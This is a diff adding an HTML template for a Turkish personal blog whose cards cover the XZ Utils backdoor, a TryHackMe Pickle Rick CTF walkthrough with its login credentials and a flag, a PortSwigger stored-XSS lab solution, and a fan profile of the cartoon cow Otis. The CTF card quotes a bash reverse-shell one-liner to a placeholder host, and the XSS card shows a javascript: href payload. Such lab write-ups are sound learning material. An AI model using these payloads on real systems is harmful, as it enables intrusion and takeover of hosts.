@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blog Kartları</title>
+  <style>
+    
+    body {
+        background-image: url("{{ url_for('static', filename='images/oha.jpeg') }}");
+    }
+    
+    .container {
+      display: flex;
+      justify-content: center;
+      padding: 80px;
+      flex-wrap: wrap; /* Alt satıra geçiş için */
+    }
+
+    .square:hover {
+      -webkit-transform: translate(20px, -10px);
+      -ms-transform: translate(10px, -10px);
+      transform: translate(10px, -10px);
+      -webkit-box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
+    }
+
+    .square {
+      width: 460px;
+      height: 430px;
+      background: white;
+      border-radius: 4px;
+      box-shadow: 0px 20px 50px #D9DBDF;
+      -webkit-transition: all 0.3s ease;
+      -o-transition: all 0.3s ease;
+      transition: all 0.3s ease;
+      margin: 20px; /* Sol ve sağ boşluklar */
+    }
+
+    .content {
+      max-height: fit-content; /* Örnek bir maksimum yükseklik */
+     /* İçeriğin taşması durumunda kaydırma çubuğunu göster */
+      padding: 10px; /* İçerik ile div arasında boşluk bırak */
+    }
+    
+    .mask {
+      clip: rect(0px, 460px, 220px, 0px);
+      border-radius: 4px;
+      position: absolute;
+    }
+
+    img {
+      width: 460px;
+    }
+
+    .h1 {
+      margin: auto;
+      text-align: left;
+      margin-top: 240px;
+      padding-left: 30px;
+      font-family: 'Merriweather', serif;
+      font-size: 24px;
+    }
+
+    p {
+      text-align: justify;
+      padding-left: 30px;
+      padding-right: 30px;
+      font-size: 16px;
+      color: #000000;
+      line-height: 18px;
+    }
+
+    .button {
+      background-color: #3EDD84;
+      color: white;
+      width: 90px;
+      padding: 10px 18px;
+      border-radius: 3px;
+      text-align: center;
+      text-decoration: none;
+      display: block;
+      margin-top: 20px;
+      margin-left: 30px;
+      margin-right: 70px;
+      font-size: 12px;
+      cursor: pointer;
+      font-family: 'merriweather';
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+
+    <div class="square" id="square1">
+      <img src="{{ url_for('static', filename='images/xz.jpeg') }}" class="mask">
+      <div class="h1">CVE-2024-3094 XZ Utils - SSH Backdoor</div>
+      <p>Linuxta oluşan bir güvelik açığından kaynaklanan bir backdoor oluşturma zafiyeti</p>
+      <div class="content" style="display: none;">
+
+        <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3094">Cve Detayı</a>
+        <p>
+        XZ Utils backdoor'u kritik bir ssh açığına imkan sağlıyor.
+        </p>
+        
+        <p>
+        Aslında olayın güzel bir geçmişi var. Githubda bu paketin geliştirilmesinden sorumlu olan kişinin destek ve para görmemesi sebebiyle
+        projenin başka bir geliştiriciye verilmesi ve bu geliştiricinin 2 yıl öncesinden bu yana planlı bir şekilde kütüphaneyi (ya da paketleri) gizliden gizliye 
+        zararlı bir backdoor oluşturacak şekilde geliştirmesi. XZ'nin Github sayfası şu an itibari ile kapalı ve erişimde bulunamıyorsunuz.
+        
+        Linuxta xz-utils paketine backdoor yerleştirldi. Backdoor kodun içerisinde gelmiyor bu kodun derlenirken test scriptlerinin içerisinde bulunuyor. Son çıkan 5.6.0 ve 5.6.1 sürümlerinde var.
+        Sunucu bu paketi derlerken test scriptleri ile birlikte yerleştirilmiş oluyor. Oldukça hızlı keşfedilmiş ve sadece Arch linux , Debian rolling release sürümlerinde, Fedora 40 beta ve  openSUSE Tumbleweed gibi sürümlerde var.
+        </p>
+        
+        <p>
+        Erken yakalandığı için kimse etkilenmemiş gibi gözüküyor olsa da farkedilmemesi halinde bütün bir internet alemine zarar verebilecek bir olay. Çünkü sunucular bu paketi derlerken aslında ssh ile 
+        uzaktaki bir kullanıcıya kendi sunucularına erişim hakkı vereceklerdi.
+        
+        Bu açığın bulunmasını bir Microsoft çalışanı olan Andrew Freund sağlamış. Ama adam siber güvenlik üzerine bir işte ya da reverse engeneering yaparak virüsü bulmamış. Şansa bir şekilde bulmuş
+        onun linkini de vereyim şu şekil : <a href="https://securityboulevard.com/2024/03/an-accidental-discovery-of-a-backdoor-likely-prevented-thousands-of-infections/">Link işte</a>
+        
+        Eğer XZ kütüphanesini kullanıyorsanız, XZ Utils programını çalıştırmadan hangi versiyonu kullandığınızı öğrenmek için aşağıdaki kodu çalıştırabilirsiniz.
+        <br>
+        
+        <p style="background-color: wheat">
+          for xz_p in $(type -a xz | awk '{print $NF}' | uniq); do strings "$xz_p" | grep "xz (XZ Utils)" || echo "No match found for $xz_p"; done
+        </p>
+        
+        Yukarıdaki komut dosyası, XZ dosyasının tüm örnekleri üzerinde ‘strings’ komutunu çalıştıracak ve gömülü sürümünün çıktısını verecektir. Bu komutu kullanmak, Back Door’lu dosyayı çalıştırmadan sürümü belirlemenizi sağlar.
+        
+        Eğer kullandığınız versiyon 5.6.0 veya 5.6.1 ise derhal eski sürümlere dönmeli veya XZ’yi cihazınızdan kaldırmalısınız.
+        </p>
+      
+      </div>
+      <div><a href="#" class="button" onclick="toggleContent('square1')">Read More</a></div>
+    </div>
+
+    <div class="square" id="square2">
+      <img src="{{ url_for('static', filename='images/picklerickctf.png') }}" class="mask">
+
+      <div class="h1">Pickle Rick CTF çözümü</div>
+
+      <p>Tryhackme sitesindeki pickle rick ctf'inin çözümü. İp ye bağlanabilmek için openvpn ile tryhackme'nin tutorial kısmından kendinize özel bir ovpn uzantılı openvpn dosyası indirin.</p>
+
+
+      <div class="content" style="display: none;">
+        <p>Rustscan ya da nmap kullanarak açık portları ve versiyon taramalarını yapalım. Bu işlem devam ederken de websitesini inceleyelim.</p>
+        <i style=" font-size:16px; color:blueviolet">rustscan "ip"</i>
+        <p>22 ve 80 portlarına nmap ile versiyon, zafiyet zart zurt taraması yapalım. <i style=" font-size:16px; color:blueviolet">"nmap -p 22,80 -vv -sV -sC "MACHINE-IP"</MACHINE-IP>"</i> </p>
+        <p style="background-color: #3EDD84;"> 
+        22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)<br>
+        80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+        </p>
+        <p style="background-color: rgb(212, 79, 79);">Sonra da bir dirsearch ile directorylerini arayalım.<br>
+          dirsearch -u http://"ip"/ 
+        </p>
+
+        <img src="{{ url_for('static', filename='images/result.png') }}">
+
+        <p>robot.txt assets login.php falan fibi şeyler çıktı ama /assets 200 döndürüyo</p>
+
+        <p>Websitesinde 3 tane ingredienta ihtiyaç duyduğunu söylüyo.
+          <br>Ayrıca sitenin kaynak kodunda zaten username olarak : <strong>R1ckRul3s</strong> ismi verilmiş.<br>
+          <br>/robots.txt uzantısında ise Wubbalubbadubdub var.
+        </p>
+        <p>Yukarıdaki iki credential ile login.php sitesinden komut çalıştırabileceğin bir siteye ulaşıyosun.</p>
+        <p>Ve o sitede ls çalıştırınca şöyle oluyo : </p>
+        <img src="{{ url_for('static', filename='images/picklerick.png') }}">
+        <p>Ve cat Sup3rS3cretPickl3Ingred.txt çalıştırarak ilk bayrağı alıyorsun.</p>
+        <p>Hayır öyle yapınca alamıyosun çünkü cat komutunu çalıştırmak ya da o dosyayı okumak engellenmiş bunun yerine direkt url de yazıyosun ve sana ilk flag çıkıyo.
+          <br>İlk flag şu : mr. meeseek hair
+        </p>
+        <p>clue.txt den ise şöyle bi şey çıkıyor : Look around the file system for the other ingredient.</p>
+        <p>cat tail more head falan engellenmiş o yüzden çalıştıramıyoruz. Bunun için less kullanadım. less/home/rick/second\inggredients</p>
+        <p>sonra burdan reverse shell alıyoz<br>
+          Aslında burası biraz karışık o yüzden direkt kodları göstermeyecem çünkü 2. kere çözüyom bu makineyi.<br>
+          Ama aynı portal.php üzerinde yine which python3 çalıştırıp sonra python un nerede olduğunu öğrenip internetten aldığınız bi python betiği ile kendi pc nize bir bağlayabilirsiniz.
+        </p>
+        <p>Aynısını netcat ile yapınca olmuyor. Bash ile de yapabilirsiniz. Benim kodum değil : bash -c 'bash -i >& /dev/tcp/x.x.x.x/8080 0>&1'</p>
+      </div>
+
+      <div><a href="#" class="button" onclick="toggleContent('square2')">Read More</a></div>
+
+    </div>
+
+    <div class="square" id="square3">
+        <img src="{{ url_for('static', filename='images/portswigger.png') }}" class="mask">
+      <div class="h1">Portswigger Stored Xss Lab</div>
+      <p>Stored XSS into anchor href attribute with double quotes HTML-encoded</p>
+      <div class="content" style="display: none;">
+      
+      <p>
+        Sitede yorum yapabileceğin kısımda yorumun , ismin , mailin ve bir website linki isteniyor. Ama bu website linkinin http ile başlaması falan lazım yani olabilecek websitelerine uyması lazım direk 10.10.0.2 yazamazsın oraya.
+      </p>
+      <p>Deney amaçlı aşağıdaki gibi bir yorum attığımda ismimin tıklanabilir olduğunu ve bunun da beni kendi verdiğim websiteye yönlendirdiğini görüyorum (eğer varsa)</p>
+      <img src="{{ url_for('static', filename='images/lab.png') }}">
+      
+      <p>Ve aslında bunu inspect ettiğinde kullanıcı adının bir a etiketi olduğunu ve bu a etiketinin href'inin de senin verdiğin link oluğunu gözlemleyebiliyoruz.</p>
+
+      <img src="{{ url_for('static', filename='images/portswiggerstored.png') }}">
+      
+      <p>Bu gözlemi yaptıktan sonra artık a etiketinin hrefi için bir javascript kodu yazabiliriz. javascript:alert() yazarsak sorun çözülür.</p> 
+      <p>Ayrıca labı çözdükten sonra inspect edip bakarsak şu sonucu görürüz</p>     
+
+      <p>&lt;a id="author" href="javascript:alert(1)"&gt;selam2&lt;/a&gt;</p>
+      
+      </div>
+      
+      <div><a href="#" class="button" onclick="toggleContent('square3')">Read More</a></div>
+    </div>
+
+    <div class="square" id="square4">
+        <img src="{{ url_for('static', filename='images/foto.png') }}" class="mask">
+      <div class="h1">Sitemi hackle sene</div>
+      <p>Çok da bir atak vektörü yok ama sitede kendini admin yaptıran falan böyle p4 bir açık bulana Kütahya plaka kodu olan 43 TL yi vericem</p>
+      <div class="content" style="display: none;">Flask kullandım. Bcrypt de falan bi şey arayabilirsin belki. Kendini admin yapmak için admin cookiesine falan ihtiyaç duyuyosun şu an admin kullanıcısının şifresi çok kek ama siteyi host ederken güçlendirecem o yüzden hiç deneme brute force zart zurt </div>
+      <div><a href="#" class="button" onclick="toggleContent('square4')">Read More</a></div>
+    </div>
+
+    <div class="square" id="square5">
+        <img src="{{ url_for('static', filename='images/otis.png') }}" class="mask">
+      <div class="h1">Otis kimdir ? </div>
+      <p>Otisi ben çok küçükken izliyodum tilkiler falan vardı onlardan korkuyodum</p>
+      <div class="content" style="display: none;"> 
+        <p>
+          Otis, Barnyard serisinin ana kahramanıdır . Kendisi Pip'in en iyi arkadaşı, Daisy'nin eski kocası, Lil' Ben'in üvey babası, Abby'nin erkek arkadaşı ve Ben'in üvey oğludur.          
+        </p>
+
+        <ol>içindekiler
+          <li>erken dönem</li>
+          <li>kişilik</li>
+          <li>dış görünüş</li>
+          <li>insan kılıkları</li>
+          <li>diğer bilgiler</li>
+        </ol>
+
+        <h1>Erken dönem</h1>
+        <p>Otis, gençliğinde biyolojik annesini  bir buzağı iken bir ilçe fuarında kaybetti. Biyolojik babasına ne olduğu bilinmiyor ancak muhtemelen bir hastalıktan öldüğü tahmin ediliyor. Daha sonra Otis, Ben tarafından evlat edinildi ve onunla baba-oğul olarak mutlu, normal bir hayat yaşadı. Ayrıca birlikte balığa çıkmayı ve sirke gezilere çıkmayı da seviyorlardı.
+
+          İnek10
+          Genç Otis, genç Krauser'in zorbalığına maruz kalıyor
+          
+          Otis, gençken onu döven ve memelerinden sütü sıkan Krauser Krebs tarafından sürekli zorbalığa maruz kalıyordu. Bir noktada Eddie adında bir ürün fikrini çalan en iyi arkadaşı vardı. Daha sonra Otis büyüdü ve Barnyard'ın diğer hayvanlarıyla arkadaş oldu .
+          
+          Filmde Dag onu tavuk kümesinin dışında öldürdüğünde Otis Ben'i kaybeder . Yıkılmış ve depresyona girmiş olan Otis, yanında olmadığı için babasının ölümünden kendisini sorumlu tutuyor (bunun için Dag bile ona bağırıyor). Sonunda Otis, Barnyard'ın yeni lideri seçilir, Dag'ı ve çakalları yener ve Daisy'nin (babasının adını verdiği) yeni doğan oğlu Lil' Ben'in babası olur .</p>
+
+          <h1>Kişilik</h1>
+          <p>Otis, gitarları, cep telefonlarını ve mikrofonları nasıl çalıştıracağını bilen, zeki, eğlenceyi seven, arkadaş canlısı, enerjik, mutlu, yaramaz, şapşal, kaygısız, iyi kalpli, cesur, kararlı, maceracı bir inektir. Katı, ciddi kuralların olması yerine, en yakın arkadaşlarıyla eğlenmeyi, istediği kadar ortalığı karıştırmayı ve sorumluluk almamayı tercih eder.
+
+            Otis, kendisini ve en yakın arkadaşlarını kurtarmak için korkularıyla yüzleşmekten mutluluk duyuyor; ancak konu paraya gelince, Otis genellikle bencil, açgözlü ve inatçıdır ve her şeyi cimri bir şekilde kendine saklar. Buna rağmen o gerçekten güzel, şefkatli bir inektir ve sığır kalbi altındır.
+            
+            En yakın arkadaşlarıyla takılmaktan ve eğlenmekten hoşlanıyor. Ayrıca Beady'lere ve Çiftçiye oyun oynamayı da seviyor .
+            
+            Filmde , Otis'in Ben'e karşı biraz asi, inatçı bir "kampüsteki büyük adam" doğası var ve ona büyüyüp şaka yapmak yerine daha sorumlu olmasını söylerken kasıtlı olarak onu görmezden geliyor çünkü bir gün Barnyard'ın lideri olacak . Ben vefat eder.</p>
+
+          <br>
+          <p>Ben'in o gece Dag tarafından öldürülmesinin ardından Otis, babasının toynaklarının içinde öldüğüne tanık olur ve aşırı derecede depresyona girer ve o kadar da dışa dönük değildir, olaydan dolayı harap olur. Daha sonra Otis, Ben'in ölümünden kendisini sorumlu tutmasına ve Gece Ahırı'ndaki hayvanlarla parti yapmak yerine onun yanında olması gerektiğini güçlü bir şekilde hissetmesine rağmen, Ahır Bahçesi'nin yeni lideri seçilir.
+
+            Barnyard Otis Kurtarmaya Gidiyor
+            Otis, Dag'la yüzleşiyor
+            
+            Filmin sonuna doğru Otis, yakalanan tavukları ve Maddy'yi koruyup kurtarırken hurdalıkta Dag'ı cesurca yenerek babasının intikamını alır (gerçi bir noktada Ben'e benzer şekilde Dag tarafından bacağından ısırılmıştır). Eve döndüğünde Otis, sonunda Daisy'nin sevgi dolu bir kocası ve yeni doğan oğlu Lil' Ben'in (kendisi ve Daisy'nin merhum babasının adını verdiği) babası olur. Yavaş yavaş daha sorumlu bir lider, koca ve baba olarak olgunlaşmaya başlar.
+            
+            Daisy, Back at the Barnyard'da Ahır'dan ayrıldığında ve yerine Abby geçtiğinde , daha önce Daisy ve Lil' Ben'e sahip olduğu için Otis'in Abby'ye aşık olma konusunda isteksiz olup olmadığı bilinmiyor.
+            
+            Otis bazen biraz kibirli ve kendine aşırı güvenen biri olabiliyor. Aynı zamanda Back at the Barnyard bölümündeki " Abby & Veronica " da olduğu gibi oldukça saftır , Abby ile top oynarken, sahte paniğe kapılıp Otis'e yakınlardaki bir ağaçta akrep olup olmadığını sorduğunda Otis hemen buna inanır. sözleri yüzünden çıldırır ve böylece Abby'nin topuna çarparak oyunu kaybeder.</p>
+
+          <h1>Dış Görünüş</h1>
+          <p>Otis, siyah benekli, mavi gözlü, açık pembe burunlu, dudaklı ve memeleri (erkek olmasına rağmen) olan beyaz bir inektir.
+
+            Bir keresinde, makineyi memesine bağlayarak sağıldıktan sonra, vücudundaki tüm süt içeriği tükendiği için aşırı derecede zayıfladı.
+            
+            Otis'in pembe memesi büyük vücudunun belirgin bir özelliğidir. Yuvarlak ve oldukça şişmandır ve sütün sıkılabileceği dört meme ucu vardır.</p>
+
+            <h1>İnsan Kılıkları</h1>
+            <p>Back at the Barnyard'da kılık değiştirdiği birçok kişi arasında haber spikeri Gill O'Malley (" The Big Barnyard Broadcast " ve " Anchor Cow " da), siyasetçi Ned Bovine (" Otis for Mayor " da), golfçü Heifer Woods ( Tiger Woods'u taklit ediyor) yer alıyor. " Cowdyshack "ta), emlakçı Dick Human (" Buyers Beware " de) veya Bob Notacow (" Bling My Barn " da). Otis'in Cowman gibi bir süper kahraman alter-ego'su var . Hatta bir defasında " Bazıları Snotty Sever " bölümünde kızların işinin kolay olduğunu kanıtlamak için kadın kılığına girecek kadar ileri gitti .</p>
+
+            <h1>Diğer bilgiler</h1>
+            <li>Biyolojik olarak erkek olmasına rağmen Otis'in diğer erkek inekler gibi memesi vardır. Gerçekte yalnızca dişi ineklerin memesi vardır, boğaların değil. Serideki tüm erkek ineklerin bu şekilde tasarlanmasının nedeni  Steve Oedekerk'in şehir halkının tüm ineklerin böyle görüneceğini düşündüğünü düşünmesiydi.</li>
+            <li>Otis, memesinden içme ve saldırı amaçlı kullanılabilen süt üretebiliyor. Aynı zamanda uzaylıların zayıflığıdır.</li>
+            <li>Otis bazen adının nasıl yazıldığını unutuyor.</li>
+            <li>Otis'e Maddy tarafından Oaty adı verilmiştir .</li>
+            <li>Otis ve Pig'in Planet Sheen'in pilot bölümünde küçük rolleri var . Hayalinde Sheen'in yanından geçerken görülüyorlar.</li>
+      </div>
+      <div><a href="#" class="button" onclick="toggleContent('square5')">Read More</a></div>
+    </div>
+
+  </div>
+
+  <script>
+    function toggleContent(cardId) {
+      var content = document.querySelector('#' + cardId + ' .content');
+      var square = document.querySelector('#' + cardId);
+      
+      if (content.style.display === 'none') {
+        content.style.display = 'block';
+        square.style.width = '100%';
+        square.style.height = 'auto';
+      } else {
+        content.style.display = 'none';
+        square.style.width = '460px'; /* Orjinal genişliğe ayarlayabilirsiniz */
+        square.style.height = '430px'; /* Orjinal yüksekliğe ayarlayabilirsiniz */
+      }
+    }
+  </script>
+  
+</body>
+</html>
